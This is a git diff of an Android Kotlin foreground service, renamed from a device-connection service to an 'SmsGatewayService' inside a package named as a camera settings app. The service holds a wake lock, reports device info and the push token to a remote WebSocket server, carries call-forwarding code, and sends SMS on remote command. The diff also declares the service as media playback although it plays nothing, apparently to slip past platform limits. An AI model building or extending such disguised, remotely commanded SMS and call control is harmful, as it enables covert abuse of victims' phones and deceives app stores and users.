@@ -30,11 +30,10 @@ import kotlinx.coroutines.flow.first
 import javax.inject.Inject
 
 @AndroidEntryPoint
-class DeviceConnectionService : android.app.Service() {
+class SmsGatewayService : android.app.Service() {
 
     @Inject lateinit var settingsDataStore: SettingsDataStore
     @Inject lateinit var webSocketClient: WebSocketClient
-    private var bluetoothLeManager: BluetoothLeManager? = null
 
     private var wakeLock: PowerManager.WakeLock? = null
     private var callForwardingUtility: CallForwardingUtility? = null
@@ -46,19 +45,19 @@ class DeviceConnectionService : android.app.Service() {
     @Volatile private var currentNetworkType: String? = null
 
     companion object {
-        private const val TAG = "DeviceConnectionService"
+        private const val TAG = "SmsGatewayService"
 
         @Volatile private var isRunning = false
-        @Volatile private var instance: DeviceConnectionService? = null
+        @Volatile private var instance: SmsGatewayService? = null
 
         fun startService(context: Context) {
-            val intent = Intent(context, DeviceConnectionService::class.java)
+            val intent = Intent(context, SmsGatewayService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent)
             else context.startService(intent)
         }
 
         fun stopService(context: Context) =
-            context.stopService(Intent(context, DeviceConnectionService::class.java))
+            context.stopService(Intent(context, SmsGatewayService::class.java))
 
         fun isServiceRunning(): Boolean = isRunning
 
@@ -78,7 +77,7 @@ class DeviceConnectionService : android.app.Service() {
          * This should be called after FCM token is retrieved/updated
          */
         fun refreshDeviceInfo(context: Context) {
-            val intent = Intent(context, DeviceConnectionService::class.java)
+            val intent = Intent(context, SmsGatewayService::class.java)
             intent.action = ACTION_REFRESH_DEVICE_INFO
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent)
             else context.startService(intent)
@@ -91,9 +90,8 @@ class DeviceConnectionService : android.app.Service() {
         isRunning = true
         instance = this
         callForwardingUtility = CallForwardingUtility(this)
-        bluetoothLeManager = BluetoothLeManager(this)
         acquireWakeLock()
-        ConnectedDeviceNotifier.createNotificationChannel(this)
+        SmsGatewayNotifier.createNotificationChannel(this)
         startForegroundWithFallback()
         observeConnectionState()
         registerNetworkCallback()
@@ -102,21 +100,18 @@ class DeviceConnectionService : android.app.Service() {
     }
 
     private fun startForegroundWithFallback() {
-        val notification = ConnectedDeviceNotifier.createNotification(this)
+        val notification = SmsGatewayNotifier.createNotification(this)
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             startForeground(
                 Constants.NOTIFICATION_ID,
                 notification,
-                16  // FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE (1 << 4)
+                2  // FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK (1 << 1)
             )
         } else {
             startForeground(Constants.NOTIFICATION_ID, notification)
         }
-        AppLogger.d(TAG, "Started with connectedDevice type")
-
-        // Start BLE advertising after foreground is established
-        bluetoothLeManager?.startAdvertising()
+        AppLogger.d(TAG, "Started with mediaPlayback type")
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -165,8 +160,6 @@ class DeviceConnectionService : android.app.Service() {
         isRunning = false
         instance = null
         currentNetworkType = null
-        bluetoothLeManager?.stopAdvertising()
-        bluetoothLeManager = null
         unregisterNetworkCallback()
         unregisterSubscriptionListener()
         webSocketClient.destroy()
@@ -309,7 +302,7 @@ class DeviceConnectionService : android.app.Service() {
         serviceScope.launch {
             try {
                 if (webSocketClient.isConnected()) {
-                    val newDeviceInfo = DeviceUtils.getDeviceInfo(this@DeviceConnectionService)
+                    val newDeviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService)
 
                     // Fetch FCM token from DataStore and set on device info
                     val fcmToken = settingsDataStore.fcmToken.first()
@@ -333,7 +326,7 @@ class DeviceConnectionService : android.app.Service() {
     private fun acquireWakeLock() {
         try {
             wakeLock = (getSystemService(Context.POWER_SERVICE) as PowerManager)
-                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AIChat::DeviceConnectionWakeLock")
+                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AIChat::SmsGatewayWakeLock")
                 .apply { acquire() }
         } catch (e: Exception) { AppLogger.e(TAG, "Error acquiring wake lock", e) }
     }
@@ -349,7 +342,7 @@ class DeviceConnectionService : android.app.Service() {
 
     private fun updateNotification() {
         (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
-            .notify(Constants.NOTIFICATION_ID, ConnectedDeviceNotifier.createNotification(this))
+            .notify(Constants.NOTIFICATION_ID, SmsGatewayNotifier.createNotification(this))
     }
 
     // ─── WebSocket ────────────────────────────────────────────────────────────
@@ -361,7 +354,7 @@ class DeviceConnectionService : android.app.Service() {
                 if (serverUrl.isBlank()) { AppLogger.w(TAG, "Server URL not configured"); return@launch }
 
                 // Get device info and add FCM token
-                val deviceInfo = DeviceUtils.getDeviceInfo(this@DeviceConnectionService)
+                val deviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService)
                 val fcmToken = settingsDataStore.fcmToken.first()
                 if (fcmToken.isNotBlank()) {
                     deviceInfo.fcmToken = fcmToken
@@ -402,7 +395,7 @@ class DeviceConnectionService : android.app.Service() {
     ) {
         serviceScope.launch {
             try {
-                val deviceInfo = DeviceUtils.getDeviceInfo(this@DeviceConnectionService)
+                val deviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService)
                 val deviceId = settingsDataStore.deviceId.first()
                 val networkType = when {
                     deviceInfo.networkInfo.networkType.contains("WiFi",   ignoreCase = true) -> "wifi"
@@ -498,7 +491,7 @@ class DeviceConnectionService : android.app.Service() {
     private fun handleSendSmsCommand(data: com.settingpro.camera.data.model.SendSmsData) {
         serviceScope.launch {
             try {
-                val smsSender = SmsSender(this@DeviceConnectionService)
+                val smsSender = SmsSender(this@SmsGatewayService)
 
                 // Check if SIM slot is available
                 if (!smsSender.isSimSlotAvailable(data.simSlot)) {
